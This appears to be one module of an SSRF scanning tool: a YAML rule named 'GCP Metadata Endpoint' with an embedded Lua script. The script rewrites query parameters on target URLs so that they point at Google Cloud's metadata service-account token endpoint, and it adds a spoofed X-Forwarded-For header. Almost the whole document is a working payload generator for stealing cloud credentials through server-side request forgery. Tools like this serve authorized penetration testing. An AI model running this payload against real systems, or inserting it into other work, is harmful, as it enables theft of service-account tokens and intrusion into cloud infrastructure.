# 17. gcp_metadata.yaml
meta:
  id: gcp_metadata
  version: 2
  name: "GCP Metadata Endpoint"
  description: "Access Google Cloud metadata service"
  author: "SSRFdevil"
  created: "2026-06-19"
  updated: "2026-07-21"
  rank: 95
  confidence: 90
  severity: critical
  tags: [gcp, metadata, cloud]
  references: []

match:
  schemes: [http, https]
  kinds: [Endpoint]
  allowed_methods: [GET, POST]
  required_tags: [Redirect, Callback, Webhook]
  require_params: true

script:
  language: lua
  entry: run_batch
  source: |
    function run_batch(targets)
        local results = {}
        local payload_vector = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
        local host_value = "metadata.google.internal"
        for _, target in ipairs(targets) do
            local base_url = target.url
            for _, param in ipairs(target.params) do
                local new_url = base_url
                if param.location == "Query" then
                    local pattern = param.name .. "=[^&]*"
                    local replacement = param.name .. "=" .. payload_vector
                    if new_url:find(pattern) then
                        new_url = new_url:gsub(pattern, replacement)
                    else
                        local sep = new_url:find("%?") and "&" or "?"
                        new_url = new_url .. sep .. replacement
                    end
                end
                table.insert(results, {
                    url = new_url,
                    method = target.method or "GET",
                    headers = { ["X-Forwarded-For"] = host_value },
                })
            end
        end
        return results
    end